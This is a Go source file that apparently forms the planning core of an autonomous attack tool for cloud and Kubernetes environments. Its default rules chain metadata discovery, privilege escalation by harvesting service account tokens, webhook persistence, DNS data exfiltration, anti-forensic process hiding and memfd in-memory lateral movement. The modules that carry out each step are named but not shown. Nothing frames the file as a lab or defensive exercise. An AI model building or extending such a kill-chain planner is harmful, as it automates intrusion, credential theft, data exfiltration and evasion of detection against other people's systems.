package autonomy

type ConditionType int

const (
	CondFactExists ConditionType = iota
	CondFactEquals
	CondHasCapability
	CondHasAsset
)

type Condition struct {
	Type  ConditionType
	Key   string
	Value string
}

type EffectType int

const (
	EffectSetFact EffectType = iota
	EffectAddCapability
	EffectAddAsset
)

type Effect struct {
	Type  EffectType
	Key   string
	Value string
}

type Rule struct {
	Name          string
	Description   string
	Objective     ObjectiveType
	Preconditions []Condition
	Module        string
	ModuleArgs    map[string]string
	PostEffects   []Effect
	Priority      int
}

func (r *Rule) Applicable(state *WorldState) bool {
	for _, cond := range r.Preconditions {
		switch cond.Type {
		case CondFactExists:
			if !state.HasFact(cond.Key) {
				return false
			}
		case CondFactEquals:
			v, ok := state.GetFact(cond.Key)
			if !ok || v != cond.Value {
				return false
			}
		case CondHasCapability:
			if !state.HasCapability(cond.Key) {
				return false
			}
		case CondHasAsset:
			if len(state.GetAssets(cond.Key)) == 0 {
				return false
			}
		}
	}
	return true
}

func (r *Rule) ApplyEffects(state *WorldState) {
	for _, eff := range r.PostEffects {
		switch eff.Type {
		case EffectSetFact:
			state.SetFact(eff.Key, eff.Value)
		case EffectAddCapability:
			state.AddCapability(eff.Key)
		case EffectAddAsset:
			state.AddAsset(Asset{Type: eff.Key, ID: eff.Value})
		}
	}
}

func DefaultRules() []Rule {
	return []Rule{
		{
			Name:      "discover_environment",
			Objective: ObjectiveDiscover,
			Module:    "cloud_metadata",
			Priority:  100,
			PostEffects: []Effect{
				{Type: EffectSetFact, Key: "environment_discovered", Value: "true"},
				{Type: EffectAddCapability, Key: "cloud_access"},
			},
		},
		{
			Name:      "discover_k8s",
			Objective: ObjectiveDiscover,
			Module:    "k8s_discovery",
			Priority:  90,
			PostEffects: []Effect{
				{Type: EffectSetFact, Key: "k8s_discovered", Value: "true"},
				{Type: EffectAddCapability, Key: "k8s_access"},
			},
		},
		{
			Name:      "escalate_via_token",
			Objective: ObjectiveEscalate,
			Module:    "service_account_token",
			Preconditions: []Condition{
				{Type: CondHasCapability, Key: "k8s_access"},
			},
			Priority: 80,
			PostEffects: []Effect{
				{Type: EffectSetFact, Key: "token_harvested", Value: "true"},
				{Type: EffectAddCapability, Key: "elevated_k8s"},
			},
		},
		{
			Name:      "persist_via_webhook",
			Objective: ObjectivePersist,
			Module:    "webhook_deploy",
			ModuleArgs: map[string]string{
				"action": "generate_certs",
			},
			Preconditions: []Condition{
				{Type: CondHasCapability, Key: "elevated_k8s"},
			},
			Priority: 70,
			PostEffects: []Effect{
				{Type: EffectSetFact, Key: "persistence_established", Value: "webhook"},
				{Type: EffectAddCapability, Key: "persistence"},
			},
		},
		{
			Name:      "exfil_via_dns",
			Objective: ObjectiveExfiltrate,
			Module:    "dns_exfil",
			Preconditions: []Condition{
				{Type: CondFactExists, Key: "environment_discovered"},
			},
			Priority: 60,
			PostEffects: []Effect{
				{Type: EffectSetFact, Key: "exfil_channel", Value: "dns"},
				{Type: EffectAddCapability, Key: "exfiltration"},
			},
		},
		{
			Name:      "evade_via_antiforensics",
			Objective: ObjectiveEvade,
			Module:    "antiforensics",
			ModuleArgs: map[string]string{
				"action": "suppress_pid",
			},
			Priority: 50,
			PostEffects: []Effect{
				{Type: EffectSetFact, Key: "evasion_active", Value: "true"},
				{Type: EffectAddCapability, Key: "stealth"},
			},
		},
		{
			Name:      "lateral_via_memexec",
			Objective: ObjectiveLateralMove,
			Module:    "memexec",
			ModuleArgs: map[string]string{
				"method": "memfd",
			},
			Preconditions: []Condition{
				{Type: CondHasCapability, Key: "stealth"},
			},
			Priority: 40,
			PostEffects: []Effect{
				{Type: EffectSetFact, Key: "lateral_movement", Value: "active"},
				{Type: EffectAddCapability, Key: "lateral"},
			},
		},
	}
}
